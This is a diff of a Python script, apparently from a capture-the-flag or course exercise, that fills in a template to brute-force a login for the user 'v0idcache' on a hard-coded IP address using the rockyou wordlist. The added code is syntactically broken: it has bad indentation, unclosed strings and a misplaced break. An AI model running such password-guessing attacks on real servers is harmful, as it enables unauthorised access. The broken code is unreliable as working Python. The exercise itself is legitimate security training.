@@ -27,39 +27,36 @@
 import socket
 
 host = "142.93.136.81" 
-port = 80 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+port = 1337
+wordlist ="rockyou.txt" # Point to wordlist file
 
 def brute_force():
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+    file = open(wordlist,"r")
+    username = "v0idcache"
 
-            # Establish socket connection
+          for password in file:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
 
-            Reading:
-
+          
+                
                 data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+           
 
-            Sending:
+ 
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-
-        General idea:
-
-            Given that you know a potential username, use a wordlist and iterate
-            through each possible password and repeatedly attempt to login to
-            v0idcache's server.
-    """
-
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+                s.send(username+"\n")   # Send a newline \n at the end of your command
+                data = s.recv(1024)
+     
+    s.send(password+"\n")
+    result = s.recv(1024)
+    print("Result:"+result);
 
 
-
+if result != "Fail\n:
+    print("Password Found:"+password)
+    break
 
 if __name__ == '__main__':
+    print("Starting: "+host+"Port:" str(port)+"\n)
     brute_force()
